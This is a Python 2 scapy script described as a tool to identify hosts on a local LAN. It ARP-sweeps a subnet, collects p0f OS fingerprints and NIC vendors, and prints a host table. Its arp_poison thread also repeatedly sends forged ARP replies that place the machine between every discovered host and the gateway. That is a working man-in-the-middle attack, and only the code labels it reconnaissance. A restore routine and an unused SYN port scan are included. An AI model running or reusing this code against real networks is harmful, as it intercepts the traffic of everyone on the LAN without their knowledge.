#!/usr/bin/python

# Identify hosts on local lan 

from scapy.all import *
from threading import Thread, Event, Lock
from Queue import Queue, Empty
import signal
import sys
import socket, struct
import time
from subprocess import PIPE, Popen
import os
import re
import optparse
import copy


ARPING_INVERVAL = 60
ARP_POISON_INTERVAL = 10

ARP_TIMEOUT = 1

P0F_LOG = 'p0flog.txt'
WORKING_PATH = os.path.dirname(os.path.realpath(__file__))

lock = Lock()



class Host(dict) :

   def __init__(self) :
      super(Host, self).__init__()
      self['open_ports'] = {'tcp' : [], 'udp' : []}

   def __getattr__(self, name) :
      if name in self :
         return self[name]
      else :
         return "Unknown"

   def __setattr__(self, name, value) :
      self[name] = value

class StopThread(Thread):

   def __init__(self, *args, **kwargs):
      super(StopThread, self).__init__(*args, **kwargs)
      self._stop = Event()

   def stop(self) :
      self._stop.set()

   def stopped(self):
      return self._stop.isSet()

host_table = defaultdict(Host)

shutdown = False
threads = []

def main(opts) :

   p0f_bin = WORKING_PATH + '/p0f'
   p0f_log = WORKING_PATH + '/' + P0F_LOG

   p0f_params = [ p0f_bin , '-p', '-i', opts.iface, '-o', p0f_log ]

   home_subnet = opts.network
   iface = opts.iface

   poison_thread = Thread(target=arp_poison, args=(iface,))
   poison_thread.daemon = True

   # do arp sweep
   arping(home_subnet, poison_thread)

   # used to signal termination 
   msg_queue = Queue()

   # events from p0f
   p0f_q = Queue()
   threads.append(Thread(target=run_p0f, args=(p0f_q,msg_queue,p0f_params)))
   

   # constant execution printing
   print_thread = StopThread(target=print_host_table, args=(None,))
   print_thread.daemon = True
   threads.append(print_thread)

   threads.append(Thread(target=tcp_scan))
   
   [ t.start() for t in threads ]

   threads.append(poison_thread)

   # handle ctrl-c
   def sig_handler(signal, frame) :
      print 'ctrl-c detected!' 
      msg_queue.put(1)

      time.sleep(2)
      #[ t.stop() for t in threads ]
      for t in threads :
         if t.isAlive():
            try:
               t._Thread__stop()
            except:
               print(str(t.getName()) + ' could not be terminated')

         #if t.isDaemon() is False :
            #t.join()

      arp_restore(iface)

      os.remove(p0f_log)
      sys.exit(0)   

   signal.signal(signal.SIGINT, sig_handler)

   while(True) :

      # fingerprint results from p0f
      try :
         pentry = p0f_q.get_nowait()
      except Empty :
         pass

      else :
         #print pentry

         host_address = None
         host_details = {}

         # determine if host (in LAN) is server or client 
         if pentry['subj'] == 'cli' and host_in_network(pentry['cli_ip'], home_subnet) :
            host_address = pentry['cli_ip']

         if pentry['subj'] == 'srv' and host_in_network(pentry['srv_ip'], home_subnet) :
            host_address = pentry['srv_ip']
            host_details['open_ports'] = 'tcp:' + pentry['srv_port']

         if 'os' in pentry :
            host_details['os'] = pentry['os']

         lock.acquire()
         try :
            add_host(host_address, host_details)
         finally :
            lock.release()



def add_host(ipaddr, details) :
   """ adds new host in host table or populates new details of host """

   if ipaddr not in host_table :
      host_table[ipaddr] = Host()

   for k,v in details.iteritems() :

      # open ports stored appended in list
      if k == 'open_ports' :
         proto, port = v.split(':')

         f = False
         for p in host_table[ipaddr][k][proto] :
            if p == port :
               f = True
         if f is not True :
            host_table[ipaddr][k][proto].append(port) 
      else :
         # all other fields overwritten
         host_table[ipaddr][k] = v


def print_host_table(args) :
   """ Print list of found hosts """

   while(True) :
      #sys.stderr.write("\x1b[2J\x1b[H")
    

      if len(host_table) == 0 :
         print "No hosts discovered"
      else :

         table = [['IP', 'NIC Vendor', 'OS', 'TCP ports']]
         for ipaddr in host_table :
            host = host_table[ipaddr]
            if ipaddr is not None :
               tcp_ports = ','.join(host.open_ports['tcp'])
               table.append([str(ipaddr), str(host.vendor), str(host.os), tcp_ports])

         pprint_table(table)
      
      time.sleep(1)

   print "Shutting down"

def host_in_network(ip, net_n_bits):
   ipaddr = struct.unpack('<L', socket.inet_aton(ip))[0]
   net, bits = net_n_bits.split('/')
   netaddr = struct.unpack('<L', socket.inet_aton(net))[0]
   netmask = ((1L << int(bits)) - 1)
   return ipaddr & netmask == netaddr & netmask

def get_iface_details(iface) :
   mac = get_if_hwaddr(iface)
   for network, mask, gw, i, addr in read_routes():
      if i == iface :
         return (mac, addr, gw)

def resolve_mac(mac) :
   if mac is not None :
      if mac[0:8] in mac_vendors :
         vendor = mac_vendors[mac[0:8]]
      else :
         vendor = "Unknown"

   return vendor

################################################################
# arp functions
################################################################

def arping(subnet, pthread) :
   """ send out broadcast arp messages, writes any replies to queue """

   found_hosts = []

   print "arp ping scan .. ",
   p_ans, p_unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet), timeout=ARP_TIMEOUT, verbose=False)
   print 'done!'

   for p in p_ans :
      mac = p[1][ARP].hwsrc
      ip = p[1][ARP].psrc
      vendor = resolve_mac(mac)

      add_host(ip, {'vendor' : vendor, 'mac' : mac })   

   pthread.start()  


def arp_poison(iface) :
   while(True) :

      mac, localaddr, gw = get_iface_details(iface)

      lock.acquire()
      try :
         for ipaddr in host_table :
            if ipaddr is not None and ipaddr != gw and ipaddr != localaddr :
               #print "poisoning " + ipaddr
               
               # tell remote host we are the gateway
               send(ARP(op=2, pdst=ipaddr, psrc=gw, hwdst=mac), verbose=False)
               
               # tell the gateway we are the remote host
               send(ARP(op=2, pdst=gw, psrc=ipaddr, hwdst=mac), verbose=False)

      finally :
         lock.release()
            
         time.sleep(1)

      time.sleep(ARP_POISON_INTERVAL)

   #time.sleep(ARPING_INVERVAL)
def arp_restore(iface) :
   print "\n\n"
   mac, localaddr, gw = get_iface_details(iface)
   for ipaddr in host_table :

      if ipaddr is not None and ipaddr != gw and ipaddr != localaddr :

         original_mac = host_table[ipaddr].mac
         gateway_mac = host_table[gw].mac
         print "restoring " + ipaddr + ' with mac ' + original_mac
         
         # tell the gatway the original mac of the remote host
         send(ARP(op=2, pdst=gw, psrc=ipaddr, hwsrc=original_mac, hwdst='ff:ff:ff:ff:ff:ff'), verbose=False)
         
         # tell the remote host the original mac of the gw
         send(ARP(op=2, pdst=ipaddr, psrc=gw, hwsrc=gateway_mac, hwdst='ff:ff:ff:ff:ff:ff'), verbose=False)

def tcp_scan() :
   return
   # copy list of hosts out of hosts table before scanning so we don't block for too long
   hosts_to_scan = []
   lock.acquire()

   try :
      hosts_to_scan = [ ip for ip in host_table ]
   finally :
      lock.release()

   for host in hosts_to_scan :
      res,unans = sr( IP(dst=host) / TCP(flags="S", dport=(1,1024)), timeout=1, verbose=False)
      
      for r in res :
         # recieve an ACK
         if r[1].haslayer(TCP) and (r[1].getlayer(TCP).flags & 2) :

            # add destination port
            port = 'tcp:' + str(r[0].getlayer(TCP).dport)
            lock.acquire()
            try :
               add_host(host, {'open_ports' : port })
            finally :
               lock.release()

         

################################################################
# p0f functions
################################################################

def parse_p0f_entry(entry) :
   """ converts p0f log entry to dict object and returns """

   # date data
   r = re.compile(r'\[(\d{4}/\d{2}/\d{2} \d{2}:\d{2}:\d{2})\] (.+)')
   match = r.match(entry)
   
   # valid date format as extra validity check
   if match is None :
      return

   datetime = match.group(1)
   vpairs = match.group(2)

   # place key / value pairs into a dict
   vpairs_s = vpairs.split('|')

   kv = {}
   for vpair in vpairs_s :
      vpair_s = vpair.split('=')
      kv[vpair_s[0]] = vpair_s[1]

   # sperate client / sever ip's and ports
   kv['cli_ip'], kv['cli_port'] = kv['cli'].split('/')
   kv['srv_ip'], kv['srv_port'] = kv['srv'].split('/')

   del kv['cli']
   del kv['srv']

   return kv

def read_p0f(proc, queue) :
   while True :
      line = proc.stdout.readline()
      queue.put(line)

def run_p0f(entry_queue, msg_queue, p0f_params) :   
   """ runs in thread. writes p0f entries to entry_queue.
       recieve exit signal from msg_queue """

   running = True
   procs = []

   # p0f binary
   procs.append(Popen(p0f_params, stdout=PIPE, stderr=PIPE))

   # p0f output log
   plog_proc = Popen(['tail', '-f', P0F_LOG], stdout=PIPE)
   procs.append(plog_proc)

   # output from p0f log
   plog_queue = Queue()

   reader_thread = Thread(target=read_p0f, args=(plog_proc, plog_queue))
   reader_thread.daemon = True
   reader_thread.start()

   # can exit on signal
   while(running is True) :
      
      # any data from p0f log?
      try :
         line = plog_queue.get_nowait()
      except Empty :
         pass
         #print "no output yet"
      else :
         entry = parse_p0f_entry(line)
         entry_queue.put(entry)

      # if we are told to exit, terminate processes first
      try : 
         if msg_queue.get_nowait() == 1 :
            print "p0f: got kill sig"
            [ p.terminate for p in procs ]
            running = False

      except Empty :
         pass

def load_mac_vendors() :
   """ parses wireshark mac address db and returns dict of mac : vendor """

   entries = {}
   f = open('mac_vendors.db', 'r')

   for lines in f.readlines() :
      entry = lines.split()
      
      # match on first column being  first six bytes
      r = re.compile(r'^([0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2})$')
      if len(entry) > 0 and r.match(entry[0]) :
         
         # lowercase as convention
         entries[entry[0].lower()] = entry[1]

   return entries
# vendor names
mac_vendors = load_mac_vendors()
def get_max_width(table, index):
    return max([len(str(row[index])) for row in table])

def pprint_table(table):
   col_paddings = []


   for i in range(len(table[0])):
      m = max([len(str(row[i])) for row in table])
      col_paddings.append(m)

   for row in table:
      # left col
      print row[0].ljust(col_paddings[0] + 1),
      # rest of the cols
      for i in range(1, len(row)):
         col = str(row[i]).rjust(col_paddings[i] + 2)
         print col,
      print ""

#main(args)

if __name__ == '__main__' :

   parser = optparse.OptionParser()
   parser.add_option('-i', action="store", dest="iface")
   parser.add_option('-n', action="store", dest="network") 
   opts, args = parser.parse_args()  
   if opts.iface is None or opts.network is None :
      print "usage: ./eyes.py -i <interface> -n <network>"
      sys.exit(1)

   main(opts)

